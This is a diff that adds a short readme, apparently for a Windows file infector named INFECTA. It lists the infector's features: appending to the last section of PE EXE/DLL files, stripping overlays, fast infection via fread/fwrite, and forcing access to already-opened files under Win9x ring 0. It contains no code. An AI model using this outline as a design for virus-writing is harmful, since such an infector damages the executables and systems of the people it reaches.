@@ -1,0 +1,9 @@
+
+ INFECTA
+ ~~~~~~~
+
+ - PE EXE/DLL
+ - last section appending
+ - warning: overlay, if present, will be stripped
+ - fast infection (accessing only required file areas via fread/fwrite)
+ - when infecting under win9x/r0, try to fuck shares on alredy-opened files
